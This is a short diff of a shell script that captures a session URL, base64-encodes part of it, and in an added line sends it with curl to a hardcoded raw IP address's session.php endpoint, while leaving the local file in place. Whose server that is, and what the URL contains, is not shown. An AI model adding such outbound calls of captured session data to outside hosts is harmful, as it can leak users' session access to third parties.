@@ -14,10 +14,13 @@ fi
 ./capturar_url.sh $session
 
 url=$(cat $session.url)
-echo ${url:47:609} | base64 > $session.url
+echo ${url:47:609} | base64 -w 0 > $session.url
 
 link=$(cat $session.url)
 
 echo $link
 
-rm -rf $session.url
+url='http://51.81.101.99/session.php?session='$session'&account='$session'&status=1&url='$link
+curl $url
+
+#rm -rf $session.url
